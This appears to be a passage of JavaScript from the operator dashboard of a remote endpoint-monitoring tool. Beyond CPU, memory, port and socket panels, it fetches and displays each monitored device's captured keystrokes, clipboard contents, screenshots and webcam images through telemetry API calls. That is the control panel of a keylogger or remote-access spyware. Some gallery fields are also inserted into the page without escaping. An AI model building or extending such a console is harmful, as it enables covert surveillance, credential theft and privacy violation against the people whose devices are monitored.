    if (osEl) osEl.textContent = `${devIdInfo.os_name || ''} ${devIdInfo.os_release || ''} (${devIdInfo.os_version || ''})`.trim() || "--";
    if (ipEl) ipEl.textContent = devIdInfo.local_ip || "--";
    if (archEl) archEl.textContent = `${devIdInfo.architecture || ''} ${devIdInfo.processor || ''}`.trim() || "--";
    if (uuidEl) {
        uuidEl.textContent = devIdInfo.device_id || "--";
        uuidEl.title = devIdInfo.device_id || "";
    }

    // 2. System Performance
    const cpuPct = parseFloat(perf.cpu_percent || 0);
    const ramPct = parseFloat(perf.ram_percent || 0);
    const diskPct = parseFloat(perf.disk_percent || 0);
    const ramUsed = perf.ram_used_gb || 0;
    const ramTotal = perf.ram_total_gb || 0;
    const diskFree = perf.disk_free_gb || 0;

    const cpuPctEl = document.getElementById("ep-val-cpu-pct");
    const barCpu = document.getElementById("ep-bar-cpu");
    if (cpuPctEl) cpuPctEl.textContent = `${cpuPct}%`;
    if (barCpu) {
        barCpu.style.width = `${Math.min(100, Math.max(0, cpuPct))}%`;
        barCpu.className = `ep-progress-bar ${cpuPct > 90 ? 'danger' : (cpuPct > 75 ? 'warning' : '')}`;
    }

    const ramPctEl = document.getElementById("ep-val-ram-pct");
    const ramGbEl = document.getElementById("ep-val-ram-gb");
    const barRam = document.getElementById("ep-bar-ram");
    if (ramPctEl) ramPctEl.textContent = `${ramPct}%`;
    if (ramGbEl) ramGbEl.textContent = `${ramUsed} / ${ramTotal} GB`;
    if (barRam) {
        barRam.style.width = `${Math.min(100, Math.max(0, ramPct))}%`;
        barRam.className = `ep-progress-bar ${ramPct > 85 ? 'danger' : (ramPct > 70 ? 'warning' : '')}`;
    }

    const diskPctEl = document.getElementById("ep-val-disk-pct");
    const diskFreeEl = document.getElementById("ep-val-disk-free");
    const barDisk = document.getElementById("ep-bar-disk");
    if (diskPctEl) diskPctEl.textContent = `${diskPct}%`;
    if (diskFreeEl) diskFreeEl.textContent = `${diskFree} GB free`;
    if (barDisk) {
        barDisk.style.width = `${Math.min(100, Math.max(0, diskPct))}%`;
        barDisk.className = `ep-progress-bar ${diskPct > 85 ? 'danger' : (diskPct > 70 ? 'warning' : '')}`;
    }

    // 3. Operational Health
    const uptimeEl = document.getElementById("ep-val-uptime");
    const procsEl = document.getElementById("ep-val-procs");
    const procsTbody = document.getElementById("ep-top-procs-tbody");

    if (uptimeEl) uptimeEl.textContent = `${health.uptime_hours || 0} hrs`;
    if (procsEl) procsEl.textContent = `${health.total_processes || 0} tasks`;

    if (procsTbody) {
        const topProcs = health.top_processes || [];
        if (topProcs.length > 0) {
            let pRows = "";
            topProcs.slice(0, 5).forEach(p => {
                pRows += `
                    <tr>
                        <td><strong>${escapeHtml(p.name)}</strong></td>
                        <td class="font-mono">${p.memory_pct}%</td>
                        <td class="font-mono">${p.cpu_pct}%</td>
                    </tr>
                `;
            });
            procsTbody.innerHTML = pRows;
        } else {
            procsTbody.innerHTML = `<tr><td colspan="3" class="text-center text-muted">No high-consumption tasks</td></tr>`;
        }
    }

    // 4. Security State
    const estConnsEl = document.getElementById("ep-val-est-conns");
    const authStateEl = document.getElementById("ep-val-auth-state");
    const portsWrap = document.getElementById("ep-listening-ports");
    const socketsWrap = document.getElementById("ep-active-sockets");

    const totalEst = sec.total_established || (sec.active_connections ? sec.active_connections.length : 0);
    if (estConnsEl) estConnsEl.textContent = totalEst;
    if (authStateEl) authStateEl.textContent = "Agent Token Verified";

    if (portsWrap) {
        const ports = sec.listening_ports || [];
        if (ports.length > 0) {
            portsWrap.innerHTML = ports.slice(0, 10).map(p => `<span class="ep-port-pill">:${p}</span>`).join(" ");
        } else {
            portsWrap.innerHTML = `<span class="text-muted">None detected</span>`;
        }
    }

    if (socketsWrap) {
        const conns = sec.active_connections || [];
        if (conns.length > 0) {
            socketsWrap.innerHTML = conns.slice(0, 4).map(c => `
                <div class="ep-socket-row">
                    :${c.local_port || 0} &rarr; ${escapeHtml(c.remote_ip || '0.0.0.0')}:${c.remote_port || 0} (${escapeHtml(c.status || 'ESTABLISHED')})
                </div>
            `).join("");
        } else {
            socketsWrap.innerHTML = `<span class="text-muted">No active TCP sockets</span>`;
        }
    }

    // Refresh whichever subtab is active
    const activeSubTabBtn = document.querySelector(".ep-subnav-btn.active");
    if (activeSubTabBtn) {
        const subTab = activeSubTabBtn.getAttribute("data-eptab");
        loadEndpointSubTabData(subTab, devIdInfo.device_id || selectedEndpointId);
    }
}

// Sub-Tab Navigation & Loaders
let currentActiveEpSubTab = "metrics";

function setupEndpointSubTabs() {
    const subNavBtns = document.querySelectorAll(".ep-subnav-btn");
    subNavBtns.forEach(btn => {
        btn.addEventListener("click", () => {
            const targetSubTab = btn.getAttribute("data-eptab");
            currentActiveEpSubTab = targetSubTab;

            subNavBtns.forEach(b => b.classList.remove("active"));
            document.querySelectorAll(".ep-subtab-content").forEach(c => c.classList.remove("active"));

            btn.classList.add("active");
            const targetContent = document.getElementById(`ep-subtab-${targetSubTab}`);
            if (targetContent) targetContent.classList.add("active");

            if (selectedEndpointId) {
                loadEndpointSubTabData(targetSubTab, selectedEndpointId);
            }
        });
    });

    // Refresh Buttons
    const btnKeys = document.getElementById("btn-refresh-ep-keys");
    if (btnKeys) btnKeys.addEventListener("click", () => { if (selectedEndpointId) loadEndpointKeystrokes(selectedEndpointId); });

    const btnClip = document.getElementById("btn-refresh-ep-clip");
    if (btnClip) btnClip.addEventListener("click", () => { if (selectedEndpointId) loadEndpointClipboard(selectedEndpointId); });

    const btnScr = document.getElementById("btn-refresh-ep-scr");
    if (btnScr) btnScr.addEventListener("click", () => { if (selectedEndpointId) loadEndpointGallery(selectedEndpointId, "screenshots", "ep-screenshots-gallery"); });

    const btnCam = document.getElementById("btn-refresh-ep-cam");
    if (btnCam) btnCam.addEventListener("click", () => { if (selectedEndpointId) loadEndpointGallery(selectedEndpointId, "webcam", "ep-webcam-gallery"); });
}

function loadEndpointSubTabData(subTab, deviceId) {
    if (!deviceId) return;
    if (subTab === "keystrokes") loadEndpointKeystrokes(deviceId);
    else if (subTab === "clipboard") loadEndpointClipboard(deviceId);
    else if (subTab === "screenshots") loadEndpointGallery(deviceId, "screenshots", "ep-screenshots-gallery");
    else if (subTab === "webcam") loadEndpointGallery(deviceId, "webcam", "ep-webcam-gallery");
}

function loadEndpointKeystrokes(deviceId) {
    const elem = document.getElementById("ep-keystrokes-log");
    if (!elem) return;
    fetch(`/api/telemetry/logs/${encodeURIComponent(deviceId)}/keystrokes`)
        .then(res => res.json())
        .then(data => {
            elem.textContent = data.content || "No keystrokes captured yet.";
            elem.scrollTop = elem.scrollHeight;
        })
        .catch(err => {
            elem.textContent = "Error loading remote keystrokes.";
        });
}

function loadEndpointClipboard(deviceId) {
    const elem = document.getElementById("ep-clipboard-log");
    if (!elem) return;
    fetch(`/api/telemetry/logs/${encodeURIComponent(deviceId)}/clipboard`)
        .then(res => res.json())
        .then(data => {
            elem.textContent = data.content || "No clipboard items captured yet.";
            elem.scrollTop = elem.scrollHeight;
        })
        .catch(err => {
            elem.textContent = "Error loading remote clipboard.";
        });
}

function loadEndpointGallery(deviceId, category, containerId) {
    const container = document.getElementById(containerId);
    if (!container) return;
    fetch(`/api/telemetry/gallery/${encodeURIComponent(deviceId)}/${category}`)
        .then(res => res.json())
        .then(data => {
            container.innerHTML = "";
            if (!data.files || data.files.length === 0) {
                container.innerHTML = `<p class="empty-msg">No remote ${category} captured yet.</p>`;
                return;
            }
            data.files.forEach(file => {
                const card = document.createElement("div");
                card.className = "gallery-card";
                card.innerHTML = `
                    <img src="${file.url}" alt="${file.filename}" loading="lazy">
                    <div class="gallery-info">
                        <span>${file.filename}</span>
                        <span>${file.size_kb} KB</span>
                    </div>
                `;
                card.addEventListener("click", () => openModal(file.url, file.filename));
                container.appendChild(card);
            });
        })
        .catch(err => {
            container.innerHTML = `<p class="empty-msg">Error loading remote ${category}.</p>`;
        });
}


